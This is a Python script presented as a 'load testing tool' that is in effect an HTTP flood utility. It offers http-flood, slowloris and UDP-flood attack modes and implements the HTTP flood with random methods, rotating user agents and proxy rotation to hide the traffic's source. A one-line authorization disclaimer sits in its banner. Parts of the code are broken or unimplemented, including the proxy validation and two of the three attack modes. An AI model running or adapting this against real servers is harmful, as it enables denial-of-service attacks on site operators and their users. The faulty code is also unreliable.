#!/usr/bin/env python3
# Author: LIONMAD

import aiohttp
import asyncio
import time
import argparse
import threading
import random
import json
import logging
from colorama import init, Fore, Style
from base64 import b64encode
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
from uuid import uuid4
import signal
import sys
import os
import subprocess
import hashlib
import zlib
import hmac
from tqdm import tqdm
import socket
import struct
import scapy.all as scapy
import dns.resolver
import psutil  # For performance monitoring

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)  # Track RPS for the last 60 seconds

# Rich User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('load_test.log'),
        logging.StreamHandler()
    ]
)

# Function to display the banner
def display_banner():
    print(f"""
{BLUE}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║               Advanced Load Testing Tool                 ║
║                                                          ║
║                      Version 1.4                         ║
║                                                          ║
║                  Coded By: LIONBAD                       ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║   ⚠ Use this tool only for legitimate purposes. ⚠        ║
║               ⚠ Obtain proper authorization. ⚠           ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{RESET}
""")

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Load Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=1500, help="Test duration (seconds)")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("--headers", help="Custom headers as JSON string")
    parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
    parser.add_argument("--results", help="File to save results (JSON)")
    parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood"], default="http-flood", help="Type of attack to perform")
    parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
    parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument("--user-agents", help="File containing custom user-agent strings")
    return parser.parse_args()

def load_proxies(proxy_file: str):
    """Load proxies from a file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    """Validate proxies."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str):
    """Check if a proxy is valid."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

def generate_payload(payload_type: str):
    """Generate a payload for HTTP requests."""
    payload_id = str(uuid4())
    if payload_type == "json":
        return json.dumps({"id": payload_id, "data": b64encode(os.urandom(64)).decode()})
    elif payload_type == "xml":
        return f"<data><id>{payload_id}</id><value>{b64encode(os.urandom(64)).decode()}</value></data>"
    elif payload_type == "form":
        return {"id": payload_id, "data": b64encode(os.urandom(64)).decode()}
    else:
        return None

async def resolve_target(target_url: str):
    """Resolve the target URL to an IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            print(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        # Use dnspython to resolve the domain to an IP
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str):
    """Check if the given string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform a rate-limited attack."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def display_status(stop_event: threading.Event, duration: int, results_file=None):
    """Display the status of the load test."""
    start_time = time.time()
    results = []
    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)
                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                }
                results.append(stats)
                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
            pbar.update(1)
            time.sleep(1)

    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        print(f"Results saved to {results_file}")

def calculate_rps_stats():
    """Calculate RPS statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame):
    """Handle interrupt signals."""
    print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    sys.exit(0)

async def main():
    """Main function to run the load test."""
    args = parse_args()

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    display_banner()

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)

    headers = json.loads(args.headers) if args.headers else None

    target = args.url.split("//")[-1].split("/")[0]

    if not await resolve_target(target):
        print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(1)

    stop_event = threading.Event()
    tasks = []

    for _ in range(args.threads):
        task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
        tasks.append(task)

    display_thread = threading.Thread(
        target=display_status, args=(stop_event, args.duration, args.results)
    )
    display_thread.daemon = True
    display_thread.start()

    signal.signal(signal.SIGINT, signal_handler)

    try:
        await asyncio.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"{RED}Interrupted by user.{RESET}")
    finally:
        stop_event.set()
        await asyncio.gather(*tasks)

    with requests_lock:
        rps_stats = calculate_rps_stats()
        print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")

if __name__ == "__main__":
    asyncio.run(main())
